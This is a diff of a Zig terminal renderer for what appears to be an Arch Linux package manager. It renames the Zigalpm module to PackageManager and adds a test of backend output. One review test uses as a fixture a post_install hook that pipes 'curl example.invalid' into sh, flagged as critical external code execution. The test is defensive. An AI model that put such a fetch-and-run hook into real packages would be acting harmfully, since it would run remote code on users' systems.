@@ -1,5 +1,5 @@
 const std = @import("std");
-const Zigalpm = @import("Zigalpm");
+const PackageManager = @import("PackageManager");
 const config_manager = @import("../config/manager.zig");
 const config_model = @import("../config/model.zig");
 const output_config = @import("config.zig");
@@ -56,7 +56,7 @@ const minimum_label_width: usize = 12;
 /// prompts, errors, flushing, and the final transaction result stay identical
 /// across ALPM, AUR, Flatpak, AppImage, local, and download commands.
 /// The runner must expose
-/// `run(context: *runtime.RuntimeContext, operation_context: *Zigalpm.OperationContext, invocation: *const parser.Invocation) anyerror!void`.
+/// `run(context: *runtime.RuntimeContext, operation_context: *PackageManager.OperationContext, invocation: *const parser.Invocation) anyerror!void`.
 pub fn output(
     context: *runtime.RuntimeContext,
     opening_message: []const u8,
@@ -66,7 +66,7 @@ pub fn output(
     success_message: ?[]const u8,
     failure_message: ?[]const u8,
 ) anyerror!bool {
-    var operation_context = Zigalpm.OperationContext.init(context.allocator, context.io);
+    var operation_context = PackageManager.OperationContext.init(context.allocator, context.io);
     context.attachTransactionLog(&operation_context);
     defer operation_context.deinit();
     var renderer = try Renderer.init(context, no_confirm);
@@ -84,7 +84,7 @@ pub fn output(
             try renderer.finishWithMessage(false, failure_message);
             return false;
         }
-        const message = try Zigalpm.user_errors.format(context.allocator, err, .{
+        const message = try PackageManager.user_errors.format(context.allocator, err, .{
             .operation = invocation.command.path,
             .subject = if (invocation.positionals.len == 1) invocation.positionals[0] else null,
         });
@@ -106,7 +106,7 @@ pub const Renderer = struct {
     settings: Settings,
     no_confirm: bool,
     animate: bool,
-    operation_context: ?*Zigalpm.OperationContext = null,
+    operation_context: ?*PackageManager.OperationContext = null,
     subscription: ?u64 = null,
     mutex: std.Io.Mutex = .init,
     owned_data: std.heap.ArenaAllocator,
@@ -130,7 +130,7 @@ pub const Renderer = struct {
         };
     }
 
-    pub fn attach(self: *Renderer, operation_context: *Zigalpm.OperationContext) !void {
+    pub fn attach(self: *Renderer, operation_context: *PackageManager.OperationContext) !void {
         std.debug.assert(self.operation_context == null);
         self.operation_context = operation_context;
         self.subscription = try operation_context.subscribe(.{
@@ -198,7 +198,7 @@ pub const Renderer = struct {
         self.mutex.lockUncancelable(self.context.io);
         defer self.mutex.unlock(self.context.io);
         self.reported_failure.store(true, .release);
-        try self.writeColoredLine(.red, "error: {f}", .{Zigalpm.user_errors.safe(message)});
+        try self.writeColoredLine(.red, "error: {f}", .{PackageManager.user_errors.safe(message)});
         try self.flush();
     }
 
@@ -222,19 +222,19 @@ pub const Renderer = struct {
         return self.write_failed.load(.acquire) or self.reported_failure.load(.acquire);
     }
 
-    fn handleEvent(data: ?*anyopaque, event: Zigalpm.OperationEvent) void {
+    fn handleEvent(data: ?*anyopaque, event: PackageManager.OperationEvent) void {
         const self: *Renderer = @ptrCast(@alignCast(data.?));
         self.mutex.lockUncancelable(self.context.io);
         defer self.mutex.unlock(self.context.io);
         self.writeEvent(event) catch self.write_failed.store(true, .release);
     }
 
-    fn writeEvent(self: *Renderer, event: Zigalpm.OperationEvent) !void {
+    fn writeEvent(self: *Renderer, event: PackageManager.OperationEvent) !void {
         switch (event) {
             .progress => |progress| try self.writeProgress(progress),
             .status => |status| try self.writeStatus(status),
             .failure => |failure| {
-                const message = try Zigalpm.user_errors.formatEvent(self.context.allocator, failure);
+                const message = try PackageManager.user_errors.formatEvent(self.context.allocator, failure);
                 defer self.context.allocator.free(message);
                 if (failure.recoverable) {
                     try self.writeColoredLine(.yellow, "warning: {s}", .{message});
@@ -395,7 +395,7 @@ pub const Renderer = struct {
 
     fn progressDisplayName(
         self: *Renderer,
-        backend: Zigalpm.OperationBackend,
+        backend: PackageManager.OperationBackend,
         subject: []const u8,
     ) ![]const u8 {
         if (backend != .flatpak) return std.fs.path.basename(subject);
@@ -490,7 +490,7 @@ pub const Renderer = struct {
         try self.context.stderr.flush();
     }
 
-    fn handleQuestion(data: ?*anyopaque, question: Zigalpm.OperationQuestion) Zigalpm.OperationQuestionResponse {
+    fn handleQuestion(data: ?*anyopaque, question: PackageManager.OperationQuestion) PackageManager.OperationQuestionResponse {
         const self: *Renderer = @ptrCast(@alignCast(data.?));
         self.mutex.lockUncancelable(self.context.io);
         defer self.mutex.unlock(self.context.io);
@@ -530,7 +530,7 @@ pub const Renderer = struct {
         };
     }
 
-    fn askQuestion(self: *Renderer, question: Zigalpm.OperationQuestion) !Zigalpm.OperationQuestionResponse {
+    fn askQuestion(self: *Renderer, question: PackageManager.OperationQuestion) !PackageManager.OperationQuestionResponse {
         try self.clearBars();
         defer self.drawBars() catch self.write_failed.store(true, .release);
         return switch (question.kind) {
@@ -556,7 +556,7 @@ pub const Renderer = struct {
 
     fn renderTransactionPlan(
         self: *Renderer,
-        question: Zigalpm.OperationQuestion,
+        question: PackageManager.OperationQuestion,
     ) !void {
         const plan = question.transaction_plan orelse return error.MissingTransactionPlan;
         try self.writeColoredLine(.cyan, "Packages to {s}:", .{@tagName(plan.action)});
@@ -617,7 +617,7 @@ pub const Renderer = struct {
 
     fn renderReview(
         self: *Renderer,
-        question: Zigalpm.OperationQuestion,
+        question: PackageManager.OperationQuestion,
         include_diff: bool,
     ) !void {
         const review = question.review orelse return error.MissingReviewPayload;
@@ -710,7 +710,7 @@ pub const Renderer = struct {
         }
     }
 
-    fn selectOne(self: *Renderer, question: Zigalpm.OperationQuestion) !usize {
+    fn selectOne(self: *Renderer, question: PackageManager.OperationQuestion) !usize {
         if (question.options.len == 0 or self.context.stdin == null) return 0;
         try self.context.stdout.print("{s}\n", .{question.prompt});
         for (question.options, 0..) |option, index| {
@@ -727,7 +727,7 @@ pub const Renderer = struct {
         }
     }
 
-    fn selectMany(self: *Renderer, question: Zigalpm.OperationQuestion) ![]const usize {
+    fn selectMany(self: *Renderer, question: PackageManager.OperationQuestion) ![]const usize {
         if (question.options.len == 0 or self.context.stdin == null) return &.{};
         try self.context.stdout.print("{s}\n", .{question.prompt});
         for (question.options, 0..) |option, index| {
@@ -796,7 +796,7 @@ fn transactionSizeText(
     buffer: []u8,
     display: SizeDisplay,
     size: ?u64,
-    source: Zigalpm.OperationTransactionPackageSource,
+    source: PackageManager.OperationTransactionPackageSource,
 ) []const u8 {
     const value = size orelse return if (source == .repository)
         "Resolved by standard transaction"
@@ -809,7 +809,7 @@ fn transactionSizeText(
     };
 }
 
-fn transactionRoleName(role: Zigalpm.OperationTransactionPackageRole) []const u8 {
+fn transactionRoleName(role: PackageManager.OperationTransactionPackageRole) []const u8 {
     return switch (role) {
         .requested => "requested",
         .dependency => "dependency",
@@ -820,7 +820,7 @@ fn transactionRoleName(role: Zigalpm.OperationTransactionPackageRole) []const u8
     };
 }
 
-fn transactionSourceName(source: Zigalpm.OperationTransactionPackageSource) []const u8 {
+fn transactionSourceName(source: PackageManager.OperationTransactionPackageSource) []const u8 {
     return switch (source) {
         .repository => "repository",
         .aur => "AUR",
@@ -894,7 +894,7 @@ fn formatFlatpakRef(
     );
 }
 
-fn operationAction(kind: Zigalpm.OperationKind) []const u8 {
+fn operationAction(kind: PackageManager.OperationKind) []const u8 {
     return switch (kind) {
         .install => "Install",
         .remove => "Remove",
@@ -1086,7 +1086,7 @@ fn renderBar(
                 for (0..width) |index| {
                     if (index == 0) {
                         try writer.writeAll(if (filled > 0) "" else "");
-                    } else if (index == width-1) {
+                    } else if (index == width - 1) {
                         try writer.writeAll(if (percentage < 100) "" else "");
                     } else {
                         try writer.writeAll(if (filled > index) "" else "");
@@ -1097,7 +1097,7 @@ fn renderBar(
     }
 }
 
-fn automaticResponse(kind: Zigalpm.OperationQuestionKind) Zigalpm.OperationQuestionResponse {
+fn automaticResponse(kind: PackageManager.OperationQuestionKind) PackageManager.OperationQuestionResponse {
     return switch (kind) {
         .confirmation, .confirm_transaction, .review_changes => .accepted,
         .import_pgp_key => .declined,
@@ -1106,31 +1106,31 @@ fn automaticResponse(kind: Zigalpm.OperationQuestionKind) Zigalpm.OperationQuest
     };
 }
 
-fn safeReviewDefault(question: Zigalpm.OperationQuestion) Zigalpm.OperationQuestionResponse {
+fn safeReviewDefault(question: PackageManager.OperationQuestion) PackageManager.OperationQuestionResponse {
     return switch (question.default_response) {
         .accepted => .accepted,
         else => .declined,
     };
 }
 
-fn hasSecurityFindings(question: Zigalpm.OperationQuestion) bool {
+fn hasSecurityFindings(question: PackageManager.OperationQuestion) bool {
     const review = question.review orelse return false;
     return review.findings.len != 0;
 }
 
-fn allOptionalDependenciesInstalled(question: Zigalpm.OperationQuestion) bool {
+fn allOptionalDependenciesInstalled(question: PackageManager.OperationQuestion) bool {
     for (question.options) |option| {
         if (!option.is_installed) return false;
     }
     return true;
 }
 
-fn isRemovalQuestion(question: Zigalpm.OperationQuestion) bool {
+fn isRemovalQuestion(question: PackageManager.OperationQuestion) bool {
     return question.kind == .confirm_transaction and
         question.transaction_plan != null and question.transaction_plan.?.action == .remove;
 }
 
-fn defaultResponse(question: Zigalpm.OperationQuestion) Zigalpm.OperationQuestionResponse {
+fn defaultResponse(question: PackageManager.OperationQuestion) PackageManager.OperationQuestionResponse {
     return switch (question.default_response) {
         .default, .deferred => automaticResponse(question.kind),
         else => question.default_response,
@@ -1160,7 +1160,7 @@ test "redirected single-pane output suppresses intermediate progress and finaliz
         .environment = &environment,
     };
     var renderer = try Renderer.init(&context, true);
-    var operation_context = Zigalpm.OperationContext.init(arena.allocator(), std.testing.io);
+    var operation_context = PackageManager.OperationContext.init(arena.allocator(), std.testing.io);
     defer {
         renderer.detach();
         operation_context.deinit();
@@ -1247,7 +1247,7 @@ test "single-pane suppresses optional dependency prompt when every option is alr
         .stderr = &stderr.writer,
     };
     var renderer = try Renderer.init(&context, false);
-    var operation_context = Zigalpm.OperationContext.init(arena.allocator(), std.testing.io);
+    var operation_context = PackageManager.OperationContext.init(arena.allocator(), std.testing.io);
     defer {
         renderer.detach();
         operation_context.deinit();
@@ -1255,7 +1255,7 @@ test "single-pane suppresses optional dependency prompt when every option is alr
     }
     try renderer.attach(&operation_context);
 
-    const options = [_]Zigalpm.OperationQuestionOption{
+    const options = [_]PackageManager.OperationQuestionOption{
         .{ .id = "foot-terminfo", .label = "foot-terminfo", .description = "Terminal info", .is_installed = true },
         .{ .id = "libnotify", .label = "libnotify", .description = "Desktop notifications", .is_installed = true },
     };
@@ -1322,7 +1322,7 @@ test "single-pane clears unknown-length bars on completion and suppresses AUR me
         .stdout_is_tty = true,
     };
     var renderer = try Renderer.init(&context, true);
-    var operation_context = Zigalpm.OperationContext.init(arena.allocator(), std.testing.io);
+    var operation_context = PackageManager.OperationContext.init(arena.allocator(), std.testing.io);
     defer {
         renderer.detach();
         operation_context.deinit();
@@ -1396,7 +1396,7 @@ test "single-pane renders complete transaction plans and build-time unknowns" {
     };
     var renderer = try Renderer.init(&context, true);
     renderer.settings.size_display = .bytes;
-    var operation_context = Zigalpm.OperationContext.init(arena.allocator(), std.testing.io);
+    var operation_context = PackageManager.OperationContext.init(arena.allocator(), std.testing.io);
     defer {
         renderer.detach();
         operation_context.deinit();
@@ -1404,7 +1404,7 @@ test "single-pane renders complete transaction plans and build-time unknowns" {
     }
     try renderer.attach(&operation_context);
 
-    const packages = [_]Zigalpm.OperationTransactionPackage{
+    const packages = [_]PackageManager.OperationTransactionPackage{
         .{
             .name = "demo",
             .source = .aur,
@@ -1464,7 +1464,7 @@ test "terminal PKGBUILD review loads collapse setting and preserves review attac
     const manager = config_manager.Manager.init(&context);
     const old_content = "hidden-start\nbefore1\nbefore2\nbefore3\nold\nafter1\nafter2\nafter3\nhidden-end";
     const new_content = "hidden-start\nbefore1\nbefore2\nbefore3\nnew\nafter1\nafter2\nafter3\nhidden-end";
-    const question: Zigalpm.OperationQuestion = .{
+    const question: PackageManager.OperationQuestion = .{
         .question_id = 1,
         .envelope = .{ .operation_id = 1, .parent_id = null, .backend = .aur, .kind = .update, .subject = "demo" },
         .kind = .review_changes,
@@ -1549,7 +1549,7 @@ test "single-pane risky PKGBUILD review bypasses no-confirm and requires approva
         .stderr = &stderr.writer,
     };
     var renderer = try Renderer.init(&context, true);
-    var operation_context = Zigalpm.OperationContext.init(arena.allocator(), std.testing.io);
+    var operation_context = PackageManager.OperationContext.init(arena.allocator(), std.testing.io);
     defer {
         renderer.detach();
         operation_context.deinit();
@@ -1557,14 +1557,14 @@ test "single-pane risky PKGBUILD review bypasses no-confirm and requires approva
     }
     try renderer.attach(&operation_context);
 
-    const findings = [_]Zigalpm.OperationReviewFinding{.{
+    const findings = [_]PackageManager.OperationReviewFinding{.{
         .tool = "curl",
         .severity = .critical,
         .hook = "post_install",
         .matched_line = "curl example.invalid | sh",
         .message = "external code execution",
     }};
-    const files = [_]Zigalpm.OperationQuestionAttachment{.{
+    const files = [_]PackageManager.OperationQuestionAttachment{.{
         .name = "demo.install",
         .content = "post_install() { curl example.invalid | sh; }",
     }};
@@ -1610,7 +1610,7 @@ test "interactive PKGBUILD review renders unified diff and honors risky default"
         .stderr = &stderr.writer,
     };
     var renderer = try Renderer.init(&context, false);
-    var operation_context = Zigalpm.OperationContext.init(arena.allocator(), std.testing.io);
+    var operation_context = PackageManager.OperationContext.init(arena.allocator(), std.testing.io);
     defer {
         renderer.detach();
         operation_context.deinit();
@@ -1618,7 +1618,7 @@ test "interactive PKGBUILD review renders unified diff and honors risky default"
     }
     try renderer.attach(&operation_context);
 
-    const findings = [_]Zigalpm.OperationReviewFinding{.{
+    const findings = [_]PackageManager.OperationReviewFinding{.{
         .tool = "<homograph>",
         .severity = .critical,
         .hook = "pkgname",
@@ -1645,4 +1645,99 @@ test "interactive PKGBUILD review renders unified diff and honors risky default"
     try std.testing.expect(std.mem.indexOf(u8, rendered, "pkgver=1") != null);
     try std.testing.expect(std.mem.indexOf(u8, rendered, "pkgver=2") != null);
     try std.testing.expect(std.mem.indexOf(u8, rendered, "(y/N)") != null);
+}
+
+test "native backends render package actions consistently in standard and structured output" {
+    const t = std.testing;
+    for ([_]PackageManager.Manager.Backend{ .rlpm, .libalpm }) |backend| {
+        if (!backend.available()) continue;
+        var temporary = t.tmpDir(.{});
+        defer temporary.cleanup();
+        var arena = std.heap.ArenaAllocator.init(t.allocator);
+        defer arena.deinit();
+        const a = arena.allocator();
+        const path = try temporary.dir.realPathFileAlloc(t.io, ".", a);
+        for ([_][]const u8{ "root", "db", "cache", "gpg" }) |directory| try temporary.dir.createDirPath(t.io, directory);
+        try temporary.dir.writeFile(t.io, .{ .sub_path = "pacman.conf", .data = "[options]\nArchitecture = auto\nSigLevel = Never\nLocalFileSigLevel = Never\n" });
+        for ([_][]const u8{ "1-1", "2-1" }) |version| {
+            var file = try temporary.dir.createFile(t.io, try std.fmt.allocPrint(a, "{s}.pkg.tar", .{version}), .{});
+            defer file.close(t.io);
+            var buffer: [4096]u8 = undefined;
+            var writer = file.writer(t.io, &buffer);
+            var tar: std.tar.Writer = .{ .underlying_writer = &writer.interface };
+            try tar.writeFileBytes(".PKGINFO", try std.fmt.allocPrint(a, "pkgname = native-output-fixture\npkgver = {s}\narch = any\nsize = 8\n", .{version}), .{ .mode = 0o644 });
+            try tar.writeFileBytes("usr/share/native-output-fixture", "fixture\n", .{ .mode = 0o644 });
+            try tar.finishPedantically();
+            try writer.interface.flush();
+        }
+        var stdout: std.Io.Writer.Allocating = .init(t.allocator);
+        defer stdout.deinit();
+        var structured: std.Io.Writer.Allocating = .init(t.allocator);
+        defer structured.deinit();
+        var stderr: std.Io.Writer.Allocating = .init(t.allocator);
+        defer stderr.deinit();
+        var environment = std.process.Environ.Map.init(a);
+        try environment.put("XDG_CONFIG_HOME", path);
+        try environment.put("COLUMNS", "80");
+        var context: runtime.RuntimeContext = .{ .allocator = a, .io = t.io, .stdout = &stdout.writer, .stderr = &stderr.writer, .environment = &environment };
+        var ui_context = context;
+        ui_context.stdout = &structured.writer;
+        var reporter: @import("ui_operation.zig").Reporter = .{ .context = &ui_context };
+        var operations = PackageManager.OperationContext.init(t.allocator, t.io);
+        defer operations.deinit();
+        const Accept = struct {
+            fn question(_: ?*anyopaque, _: PackageManager.operation.Question) PackageManager.operation.QuestionResponse {
+                return .accepted;
+            }
+        };
+        operations.setQuestionHandler(.{ .function = Accept.question });
+        _ = try operations.subscribe(.{ .function = @import("ui_operation.zig").Reporter.handle, .data = &reporter });
+        var renderer = try Renderer.init(&context, true);
+        defer renderer.deinit();
+        try renderer.attach(&operations);
+        defer renderer.detach();
+        const manager = try PackageManager.Manager.init(t.allocator, t.environ, .{
+            .backend = backend,
+            .config_path = try std.fs.path.join(a, &.{ path, "pacman.conf" }),
+            .root_directory = try std.fs.path.join(a, &.{ path, "root" }),
+            .database_path = try std.fs.path.join(a, &.{ path, "db" }),
+            .cache_directory = try std.fs.path.join(a, &.{ path, "cache" }),
+            .gpg_directory = try std.fs.path.join(a, &.{ path, "gpg" }),
+            .log_file = try std.fs.path.join(a, &.{ path, "log" }),
+            .root_hooks_only = true,
+            .operation_context = &operations,
+        });
+        defer manager.deinit();
+        for ([_][]const u8{ "1-1", "2-1", "2-1", "1-1" }) |version| {
+            const archive = try std.fmt.allocPrint(a, "{s}/{s}.pkg.tar", .{ path, version });
+            try manager.install_local_packages(&.{archive}, .{ .nohooks = true, .noscriptlet = true });
+        }
+        var targets = [_][:0]const u8{"native-output-fixture"};
+        try manager.remove_packages_with_confirmation(&targets, .{ .nohooks = true, .noscriptlet = true }, true, .already_approved);
+        try renderer.finish(true);
+        try t.expect(!reporter.failed());
+        const text = stdout.written();
+        for ([_][]const u8{ "AddStart", "UpgradeStart", "ReinstallStart", "DowngradeStart", "RemoveStart" }) |action| {
+            const label = try std.fmt.allocPrint(a, "{s} native-output-fixture", .{action});
+            try t.expectEqual(@as(usize, 1), std.mem.count(u8, text, label));
+        }
+        var decoded_frames: std.Io.Writer.Allocating = .init(t.allocator);
+        defer decoded_frames.deinit();
+        var frames = std.mem.splitSequence(u8, structured.written(), "[/JSON]\n");
+        while (frames.next()) |frame| {
+            if (frame.len == 0) continue;
+            try t.expect(std.mem.startsWith(u8, frame, "[JSON]"));
+            const encoded = frame["[JSON]".len..];
+            const decoded = try a.alloc(u8, try std.base64.standard.Decoder.calcSizeForSlice(encoded));
+            try std.base64.standard.Decoder.decode(decoded, encoded);
+            try decoded_frames.writer.writeAll(decoded);
+        }
+        for ([_][]const u8{ "PackageInstalled", "PackageUpgraded", "PackageReinstalled", "PackageDowngraded", "PackageRemoved" }) |event_type| {
+            const field = try std.fmt.allocPrint(a, "\"EventType\":\"{s}\"", .{event_type});
+            try t.expectEqual(@as(usize, 1), std.mem.count(u8, decoded_frames.written(), field));
+        }
+        try t.expect(std.mem.indexOf(u8, decoded_frames.written(), "\"PackageName\":\"native-output-fixture\"") != null);
+        try t.expect(std.mem.indexOf(u8, text, "\nupgrade\n") == null);
+        try t.expect(std.mem.indexOf(u8, text, "\nprepared\n") == null);
+    }
 }
